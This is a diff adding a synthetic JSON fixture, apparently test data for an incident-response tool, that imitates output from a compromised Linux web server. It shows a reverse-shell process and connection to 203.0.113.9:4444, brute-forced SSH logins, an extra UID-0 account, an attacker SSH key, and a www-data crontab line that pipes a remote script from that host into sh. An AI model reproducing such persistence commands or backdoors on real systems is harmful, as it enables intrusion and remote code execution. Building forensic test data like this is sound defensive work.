@@ -1,0 +1,40 @@
+{
+ "synthetic": "SYNTHETIC — written to resemble real command output from a compromised host; not data from any real machine",
+ "tool": "kar-irhelper/1",
+ "os": "linux",
+ "host": "web1",
+ "collectedAt": "2026-11-16T12:00:00Z",
+ "outputs": {
+  "processes": "    1 root     Mon Nov 16 08:00:01 2026 /sbin/init\n  640 root     Mon Nov 16 08:00:09 2026 /usr/sbin/nginx -g daemon on;\n  812 www-data Mon Nov 16 10:31:02 2026 /tmp/.x/kworker -c 203.0.113.9:4444\n  999 root     Mon Nov 16 08:00:05 2026 /usr/sbin/sshd -D",
+  "sockets": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp   LISTEN 0      128    0.0.0.0:22         0.0.0.0:*         users:((\"sshd\",pid=999,fd=3))\ntcp   LISTEN 0      511    0.0.0.0:443        0.0.0.0:*         users:((\"nginx\",pid=640,fd=6))\ntcp   ESTAB  0      0      10.0.0.5:39012     203.0.113.9:4444  users:((\"bash\",pid=1337,fd=3))",
+  "accounts": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsvc:x:0:0::/home/svc:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/bash",
+  "ssh-log": "2026-11-16T10:20:00+0000 web1 sshd[20]: Failed password for alice from 203.0.113.9 port 50000 ssh2\n2026-11-16T10:21:00+0000 web1 sshd[21]: Failed password for alice from 203.0.113.9 port 50001 ssh2\n2026-11-16T10:22:00+0000 web1 sshd[22]: Failed password for alice from 203.0.113.9 port 50002 ssh2\n2026-11-16T10:23:00+0000 web1 sshd[23]: Failed password for alice from 203.0.113.9 port 50003 ssh2\n2026-11-16T10:24:00+0000 web1 sshd[24]: Failed password for alice from 203.0.113.9 port 50004 ssh2\n2026-11-16T10:25:00+0000 web1 sshd[25]: Failed password for alice from 203.0.113.9 port 50005 ssh2\n2026-11-16T10:28:00+0000 web1 sshd[30]: Accepted password for alice from 203.0.113.9 port 50100 ssh2\n2026-11-16T11:05:00+0000 web1 sshd[41]: Accepted publickey for alice from 192.0.2.10 port 61000 ssh2"
+ },
+ "files": [
+  {
+   "id": "cron",
+   "path": "/etc/crontab",
+   "mtime": "2026-01-01T00:00:00Z",
+   "text": "# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
+  },
+  {
+   "id": "cron",
+   "path": "/var/spool/cron/crontabs/www-data",
+   "mtime": "2026-11-16T10:35:00Z",
+   "text": "*/5 * * * * curl -s http://203.0.113.9/p | sh\n"
+  },
+  {
+   "id": "ssh-keys",
+   "path": "/home/alice/.ssh/authorized_keys",
+   "mtime": "2026-11-16T10:33:00Z",
+   "text": "ssh-ed25519 AAAAC3Nza…(attacker) x@y"
+  },
+  {
+   "id": "ssh-keys",
+   "path": "/root/.ssh/authorized_keys",
+   "mtime": "2025-06-01T00:00:00Z",
+   "text": "ssh-ed25519 AAAAC3Nza…(admin) admin@laptop"
+  }
+ ],
+ "errors": {}
+}
